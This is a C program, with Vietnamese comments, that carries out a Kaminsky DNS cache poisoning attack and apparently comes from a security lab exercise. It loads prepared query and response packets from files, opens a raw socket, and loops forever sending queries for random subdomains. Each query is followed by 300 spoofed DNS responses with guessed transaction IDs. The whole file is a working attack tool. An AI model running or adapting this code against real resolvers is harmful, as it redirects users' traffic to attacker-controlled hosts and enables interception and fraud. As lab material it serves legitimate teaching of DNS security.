#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define MAX_FILE_SIZE 1000000

/* IP Header */
struct ipheader {
  unsigned char      iph_ihl:4,
                     iph_ver:4;
  unsigned char      iph_tos;
  unsigned short int iph_len;
  unsigned short int iph_ident;
  unsigned short int iph_flag:3,
                     iph_offset:13;
  unsigned char      iph_ttl;
  unsigned char      iph_protocol;
  unsigned short int iph_chksum;
  struct  in_addr    iph_sourceip;
  struct  in_addr    iph_destip;
};

void send_raw_packet(int sock, char * buffer, int pkt_size);

int main()
{
  setvbuf(stdout, NULL, _IONBF, 0);
  srand(time(NULL));

  // 1. Doc file ip_req.bin
  FILE * f_req = fopen("ip_req.bin", "rb");
  if (!f_req) {
     perror("Khong the mo file 'ip_req.bin'");
     exit(1);
  }
  unsigned char ip_req[MAX_FILE_SIZE];
  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);
  fclose(f_req);

  // 2. Doc file ip_resp.bin
  FILE * f_resp = fopen("ip_resp.bin", "rb");
  if (!f_resp) {
     perror("Khong the mo file 'ip_resp.bin'");
     exit(1);
  }
  unsigned char ip_resp[MAX_FILE_SIZE];
  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);
  fclose(f_resp);

  // 3. Khoi tao raw socket dung chung de dat toc do cao nhat
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (sock < 0) {
      perror("Khong the khoi tao Raw Socket (can chay voi sudo)");
      exit(1);
  }
  int enable = 1;
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

  char a[26] = "abcdefghijklmnopqrstuvwxyz";
  int count = 0;
  printf("=== BAT DAU TAN CONG KAMINSKY DNS CACHE POISONING ===\n");
  printf("[*] Dang ban query va goi tin gia mao toi Local DNS Server...\n");

  while (1) {
    // Tao subdomain ngau nhien co do dai 5 ky tu
    char name[6];
    name[5] = '\0';
    for (int k = 0; k < 5; k++) {
        name[k] = a[rand() % 26];
    }

    // Buoc 1: Sua ten mien trong goi query (offset = 41) va gui toi Local DNS Server
    memcpy(ip_req + 41, name, 5);
    send_raw_packet(sock, (char *)ip_req, n_req);

    // Buoc 2: Sua ten mien trong goi response (Question: offset 41, Answer: offset 64)
    memcpy(ip_resp + 41, name, 5);
    memcpy(ip_resp + 64, name, 5);

    // Buoc 3: Ban hang loat goi tin DNS Response gia mao voi cac Transaction ID khac nhau
    for (int i = 0; i < 300; i++) {
        unsigned short id = htons(rand() % 65536);
        memcpy(ip_resp + 28, &id, 2);
        send_raw_packet(sock, (char *)ip_resp, n_resp);
    }

    count++;
    if (count % 50 == 0) {
        printf("[+] Da gui %d dot query va phan hoi gia mao...\n", count);
    }
  }

  close(sock);
  return 0;
}

void send_raw_packet(int sock, char * buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  struct ipheader *ip = (struct ipheader *) buffer;

  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  sendto(sock, buffer, pkt_size, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
}
